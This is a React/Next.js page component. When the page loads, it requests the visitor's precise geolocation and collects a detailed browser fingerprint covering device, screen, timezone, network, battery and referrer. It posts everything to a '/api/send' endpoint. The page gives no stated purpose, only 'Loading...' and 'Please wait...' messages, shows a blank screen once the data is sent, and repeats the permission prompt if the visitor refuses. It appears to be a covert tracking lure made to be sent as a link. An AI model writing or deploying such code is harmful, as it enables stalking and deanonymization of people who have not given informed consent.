"use client";

import { useEffect, useState, useCallback } from "react";

async function collectBrowserInfo() {
  const nav = navigator as any;
  const info: Record<string, string> = {};

  info.userAgent = navigator.userAgent;
  info.language = navigator.language;
  info.languages = navigator.languages?.join(", ") || "";
  info.platform = nav.platform || "";
  info.vendor = navigator.vendor || "";
  info.cookiesEnabled = String(navigator.cookieEnabled);
  info.doNotTrack = nav.doNotTrack || "";
  info.hardwareConcurrency = String(navigator.hardwareConcurrency || "");
  info.maxTouchPoints = String(navigator.maxTouchPoints || 0);
  info.deviceMemory = String(nav.deviceMemory || "unknown");
  info.screenWidth = String(screen.width);
  info.screenHeight = String(screen.height);
  info.screenColorDepth = String(screen.colorDepth);
  info.screenPixelDepth = String(screen.pixelDepth);
  info.windowWidth = String(window.innerWidth);
  info.windowHeight = String(window.innerHeight);
  info.devicePixelRatio = String(window.devicePixelRatio);
  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  info.timezoneOffset = String(new Date().getTimezoneOffset());
  info.online = String(navigator.onLine);
  info.referrer = document.referrer || "direct";

  const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
  if (conn) {
    info.connectionType = conn.effectiveType || "";
    info.downlink = String(conn.downlink || "");
    info.rtt = String(conn.rtt || "");
    info.saveData = String(conn.saveData || false);
  }

  try {
    const battery = await nav.getBattery?.();
    if (battery) {
      info.batteryLevel = String(Math.round(battery.level * 100)) + "%";
      info.batteryCharging = String(battery.charging);
    }
  } catch {}

  return info;
}

export default function Home() {
  const [status, setStatus] = useState("Loading...");
  const [denied, setDenied] = useState(false);
  const [done, setDone] = useState(false);

  const requestLocation = useCallback(() => {
    setDenied(false);
    setDone(false);
    setStatus("Loading...");

    if (!navigator.geolocation) {
      setStatus("This browser is not supported");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        setStatus("Loading...");

        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;
        const browserInfo = await collectBrowserInfo();

        setStatus("Please wait...");

        try {
          const res = await fetch("/api/send", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              altitude,
              altitudeAccuracy,
              heading,
              speed,
              timestamp: pos.timestamp,
              browserInfo,
            }),
          });

          if (res.ok) {
            setDone(true);
            setStatus("");
          } else {
            setStatus("Something went wrong");
          }
        } catch {
          setStatus("Failed to send");
        }
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
          setDenied(true);
          setStatus("");
        } else {
          setStatus("Something went wrong. Please try again.");
        }
      },
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  }, []);

  useEffect(() => {
    requestLocation();
  }, [requestLocation]);

  if (done) return <div className="min-h-screen bg-white" />;

  return (
    <div className="min-h-screen flex flex-col gap-4 items-center justify-center bg-white px-6">
      {denied ? (
        <>
          <p className="text-lg text-gray-800 text-center">
            Please accept the permission to continue.
          </p>
          <button
            onClick={requestLocation}
            className="px-6 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 transition"
          >
            Try Again
          </button>
          <p className="text-xs text-gray-400 text-center max-w-xs">
            You may need to update your browser settings if you previously denied it.
          </p>
        </>
      ) : (
        <p className="text-lg text-gray-700">{status}</p>
      )}
    </div>
  );
}
